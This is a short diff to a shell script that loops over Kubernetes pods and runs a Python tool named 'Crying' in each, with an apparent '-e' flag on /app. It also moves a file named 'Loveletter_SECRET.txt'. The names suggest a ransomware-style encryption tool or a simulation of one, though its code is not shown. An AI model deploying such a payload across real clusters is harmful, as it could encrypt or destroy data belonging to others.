@@ -71,15 +71,15 @@ for IP in $POD_IPS; do
 
         # Execute the script inside the pod
         echo "Executing the script inside the pod $POD_NAME..."
-        kubectl exec "$POD_NAME" -- sh -c "chmod +x /app/Crying/main.py" || {
+        kubectl exec "$POD_NAME" -- sh -c "chmod +x /Crying/main.py" || {
             echo "Failed to execute Crying.sh in pod: $POD_NAME"
             continue
         }
-        kubectl exec "$POD_NAME" -- sh -c "python3 /app/Crying/main.py -p /app -e" || {
+        kubectl exec "$POD_NAME" -- sh -c "python3 /Crying/main.py -p /app -e" || {
             echo "Failed to execute main.py in pod: $POD_NAME"
         }
 
-        mv /Crying/Loveletter_SECRET.txt
+        mv /Crying/Loveletter_SECRET.txt /app
         
         echo "Scripts executed successfully in pod: $POD_NAME"
     else
